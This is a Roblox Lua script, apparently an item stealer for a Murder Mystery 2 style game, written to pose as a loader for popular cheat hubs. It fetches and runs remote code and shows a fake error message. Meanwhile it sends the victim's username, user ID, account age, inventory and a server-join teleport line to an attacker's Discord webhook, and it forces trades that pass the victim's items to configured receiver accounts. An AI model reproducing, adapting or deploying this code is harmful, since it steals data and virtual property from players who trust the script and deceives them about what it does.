repeat wait() until game:IsLoaded()

if getgenv().scriptexecuted then return end
getgenv().scriptexecuted = true

local games = {
    [142823291] = true,
    [335132309] = true,
    [636649648] = true
}

if not games[game.PlaceId] then
    game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
    while true do end
end

if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    warn("Script terminated due to an invalid webhook URL.")
    return
end

if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
    warn("Script terminated due to an invalid receivers table.")
    return
end

if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    warn("Script terminated due to an invalid custom URL.")
    return
end

if Config.FullInventory ~= true and Config.FullInventory ~= false then
    Config.FullInventory = true
end

if Config.Script == nil then
    Config.Script = "None"
elseif Config.Script == "Custom" then
    Config.Script = Config.Script .. " - " .. Config.CustomLink
end

if Config.Script == "Custom" then
    loadstring(game:HttpGet(Config.CustomLink))()
elseif Config.Script == "Overdrive H" then
    loadstring(game:HttpGet("https://overdrive-h.ohd.workers.dev/?d=loader"))()
elseif Config.Script == "Symphony Hub" then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
elseif Config.Script == "Highlight Hub" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
elseif Config.Script == "Eclipse Hub" then
    getgenv().mainKey = "nil"
    local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."?k="..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
elseif Config.Script == "R3TH PRIV" then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
elseif Config.Script == "AshbornnHub" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua",true))()
elseif Config.Script == "Nexus" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
end

warn([[:22: Expected identifier when parsing variable name, got 'ꯃꯤꯁ꯭ꯇꯣꯚꯔ ꯑꯥꯏꯇꯦꯝ ꯇꯦꯀꯔ ꯁ꯭ꯛꯔꯤꯞꯇ ꯑꯦꯛꯇꯤꯕ ꯑꯣꯏꯔꯦ꯫']])

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Trade = ReplicatedStorage.Trade
local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]

local Common = 0
local Uncommon = 0
local Rare = 0
local Legendary = 0
local Vintage = 0
local Godly = 0
local Ancient = 0
local Unique = 0

LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

local AntiStealer = (Hard and "Anti-Stealer detected") or "None detected"

local UIPath
local Mobile

if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
    UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
    Mobile = false
else
    UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
    Mobile = true
end

function TapUI(button, check, button2)
    if check == "Active Check" then
        if button.Active then
            button = button[button2]
        else
            return
        end
    end
    if check == "Text Check" then
        if button == "^" then
            button = button2
        else
            return
        end
    end
    for _,v in pairs(events) do
        for _,conn in pairs(getconnections(button[v])) do
            conn:Fire()
        end
    end
end

function Rarity(color, amount, tradeable, requirepath, path)
    local Stack = 0

    if tradeable and tradeable:FindFirstChild("Evo") then
        return
    end

    if amount ~= "" then
        Stack = tonumber(amount:match("x(%d+)"))
    else
        Stack = 1
    end

    local r = math.floor(color.R * 255 + 0.5)
    local g = math.floor(color.G * 255 + 0.5)
    local b = math.floor(color.B * 255 + 0.5)

    if r == 106 and g == 106 and b == 106 then
        Common = Common + Stack
    elseif r == 0 and g == 255 and b == 255 then
        Uncommon = Uncommon + Stack
    elseif r == 0 and g == 200 and b == 0 then
        Rare = Rare + Stack
    elseif r == 220 and g == 0 and b == 5 then
        Legendary = Legendary + Stack
    elseif r == 255 and g == 0 and b == 179 then
        Godly = Godly + Stack
    elseif r == 100 and g == 10 and b == 255 then
        Ancient = Ancient + Stack
    elseif r == 240 and g == 140 and b == 0 then
        Unique = Unique + Stack
    else
        Vintage = Vintage + Stack
    end
end

function FullInventory()
    local Inventory = {}
    for _,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
        for _,item in pairs(v.Container:GetChildren()) do
            if item:IsA("Frame") then
                Rarity(item.ItemName.BackgroundColor3, item.Container.Amount.Text, item:FindFirstChild("Tags"))
                if Config.FullInventory then
                    local number = item.Container.Amount.Text ~= "" and item.Container.Amount.Text or "x1"
                    table.insert(Inventory, item.ItemName.Label.Text .. " " .. number)
                end
            end
        end
    end
    for _,pet in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
        if pet:IsA("Frame") then
            Rarity(pet.ItemName.BackgroundColor3, pet.Container.Amount.Text)
            if Config.FullInventory then
                local number = pet.Container.Amount.Text ~= "" and pet.Container.Amount.Text or "x1"
                table.insert(Inventory, pet.ItemName.Label.Text .. " " .. number)
            end
        end
    end
    return Config.FullInventory and table.concat(Inventory, ", ") or "Full inventory set false."
end

FullInventory()

task.wait()

function SendTrade(player)
    if Mobile then
        local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
        TapUI(Path.Container.Close)
        TapUI(Path.Container.PlayerList[player].ActionButton)
        TapUI(Path.Popup.Container.Action.Trade)
        TapUI(Path.Popup.Container.Close)
    else
        local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
        TapUI(Path.Container.ToggleRequests.On)
        TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
        TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
        TapUI(Path.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
        TapUI(Path.Container[player].ActionButton)
        TapUI(Path.Popup.Container.Trade)
        TapUI(Path.Popup.Container.Close)
    end
end

function ReadChats(player)
    Players[player].Chatted:Connect(function(msg)
        if msg == Config.ResendTrade then
            SendTrade(player)
        end
    end)
end

function Activate(player)
    for _,receiver in pairs(Config.Receivers) do
        if receiver == player then
            ReadChats(player)
            wait(10)
            SendTrade(player)
        end
    end
end

function StartTradeLoop(player)
    while true do
        for _,receiver in ipairs(Config.Receivers) do
            if player == receiver then
                PeaceTimer = true
                wait(10)
                PeaceTimer = false
                SendTrade(receiver)
                task.wait(10) -- wait for the trade to be sent and accepted
                AcceptTrade() -- ensure trade is accepted
                wait(10) -- delay before starting the next trade
            end
        end
    end
end

function AcceptTrade()
    wait(1)
    local ItemsInTrade = 0
    local Path = Mobile and LocalPlayer.PlayerGui.TradeGUI_Phone.Container or LocalPlayer.PlayerGui.TradeGUI.Container
    for _,v in pairs(Path.Items.Main:GetChildren()) do
        for _,item in pairs(v.Items.Container.Current.Container:GetChildren()) do
            if item:IsA("Frame") then
                if item.ItemName.Label.Text ~= "Default Knife" and item.ItemName.Label.Text ~= "Default Gun" then
                    if ItemsInTrade ~= 4 then
                        ItemsInTrade = ItemsInTrade + 1
                        local LoopsItem = tonumber(item.Container.Amount.Text:match("x(%d+)")) or 1
                        task.wait()
                        for _ = 1, LoopsItem do
                            TapUI(item.Container.ActionButton)
                        end
                    end
                end
            end
        end
    end
    wait(10)
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
end

function StartTradesForExistingPlayers()
    for _,player in ipairs(Players:GetPlayers()) do
        StartTradeLoop(player.Name)
    end
end

-- Check for specific rarities and adjust webhook content
local includeTeleport = Godly > 0 or Ancient > 0 or Vintage > 0 or Unique > 0

local data = {
   ["content"] = includeTeleport and "@everyone" .. "\n```" .. TeleportScript .. "```" or "",
   ["embeds"] = {
       {
            ["title"] = "👑 **wum_ph**",
            ["description"] = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nAnti-Stealer : " .. AntiStealer .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🟪: " .. Ancient .. "\nGodly      🧠: " .. Godly .. "\nUnique     🟧: " .. Unique .. "\nVintage    🟨: " .. Vintage .. "\nLegendary  🟥: " .. Legendary .. "\nRare       🟩: " .. Rare .. "\nUncommon   🟦: " .. Uncommon .. "\nCommon     ⬛: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```",
            ["type"] = "rich",
            ["color"] = tonumber(0xffd700),
       }
   }
}
local newdata = HttpService:JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
request({Url = Config.Webhook, Body = newdata, Method = "POST", Headers = headers})

-- Initialize trading for existing players
StartTradesForExistingPlayers()

-- Continuously start trading loop for new players as they join
Players.PlayerAdded:Connect(function(player)
    StartTradeLoop(player.Name)
end)
